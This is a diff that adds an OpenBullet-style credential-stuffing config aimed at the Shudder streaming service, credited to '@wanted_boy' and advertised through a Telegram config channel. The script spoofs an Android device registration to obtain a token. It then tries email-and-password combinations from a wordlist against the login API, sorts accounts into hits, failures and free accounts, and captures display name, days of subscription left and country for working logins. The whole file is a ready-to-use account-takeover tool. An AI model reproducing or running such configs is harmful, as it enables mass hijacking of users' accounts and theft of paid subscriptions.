@@ -1,0 +1,122 @@
+[SETTINGS]
+{
+  "Name": "shudder.com",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-12T01:23:53.5748323+08:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@wanted_boy",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BEGIN SCRIPT JavaScript
+function generateString(length) {
+ var result = '';
+ var characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
+ var charactersLength = characters.length;
+ for ( var i = 0; i < length; i++ ){
+        result += characters.charAt(Math.floor(Math.random() * charactersLength));
+    }
+    return result;
+}
+var Output = generateString(16);
+var Output2 = generateString(32);
+time = Date.now();
+Randm = Math.floor(Math.random() * 8000000) + 1000000;
+Randm2 = Math.floor(Math.random() * 80000000) + 10000000;
+END SCRIPT -> VARS "Output,Output2,time,Randm,Randm2"
+
+#base64 FUNCTION Base64Encode "{\"v\":[0,2],\"d\":{\"d.ty\":\"Mobile\",\"d.ac\":\"<Randm>\",\"d.ap\":\"<Randm2>\",\"d.tr\":\"<Output2>\",\"d.id\":\"<Output>\",\"d.ti\":<time>}}" -> VAR "base64" 
+
+#Post REQUEST POST "https://devices.amcsvod.io/v1/register" 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: devices.amcsvod.io" 
+  HEADER "Cache-Control: no-cache" 
+  HEADER "X-Platform-Name: android" 
+  HEADER "X-Device-Id: <Output>" 
+  HEADER "X-Service-Name: shudder" 
+  HEADER "Traceparent: 00-<Output2>--00" 
+  HEADER "Tracestate: @nr=0-2-<Randm>-<Randm2>-----<time>" 
+  HEADER "Newrelic: <base64>" 
+  HEADER "Content-Length: 0" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: okhttp/3.12.3" 
+  HEADER "X-Newrelic-Id: VQUGVVVaDxABXVNWAAYGUA==" 
+
+IF "<RESPONSECODE>" EqualTo "451"
+SET STATUS BAN
+ENDIF
+
+#Login REQUEST POST "https://auth.amcsvod.io/v1/login" 
+  CONTENT "{\"password\":\"<PASS>\",\"username\":\"<USER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: auth.amcsvod.io" 
+  HEADER "Cache-Control: no-cache" 
+  HEADER "Authorization: Bearer <HEADERS(X-API-DEVICE-TOKEN)>" 
+  HEADER "X-Platform-Name: android" 
+  HEADER "X-Device-Id: <Output>" 
+  HEADER "X-Service-Name: shudder" 
+  HEADER "Tracestate: @nr=0-2-<Randm>-<Randm2>-----<time>" 
+  HEADER "Traceparent: 00-<Output2>--00" 
+  HEADER "Newrelic: <base64>" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: Shudder, Android, 7.1.2, samsung, SM-N975F, 3.12.07(1030956)" 
+  HEADER "X-Newrelic-Id: VQUGVVVaDxABXVNWAAYGUA==" 
+  HEADER "Connection: close" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "display_name" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username or password." 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "subscriptions\": []," 
+
+#displayName PARSE "<SOURCE>" JSON "display_name" CreateEmpty=FALSE -> CAP "displayName" 
+
+#expireDate PARSE "<SOURCE>" REGEX "current_period_end_date\":\"(\\d{4}-\\d{2}-\\d{2})T" "[1]" -> VAR "expireDate" 
+
+#unix FUNCTION DateToUnixTime "yyyy-MM-dd" "<expireDate>" -> VAR "unix" 
+
+#current FUNCTION CurrentUnixTime -> VAR "current" 
+
+IF "<unix>" LessThan "<current>"
+SET STATUS CUSTOM "FREE"
+ENDIF
+
+#compute FUNCTION Compute "(<unix>-<current>)/86400" -> VAR "compute" 
+
+#daysLeft FUNCTION Round "<compute>" -> CAP "daysLeft" 
+
+#country PARSE "<SOURCE>" JSON "country.official_name" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "country" 
+
+SET CAP "Config By" "@wanted_boy"
+SET CAP "Telegram Channel" "https://t.me/OpenBulletConfigs"
+
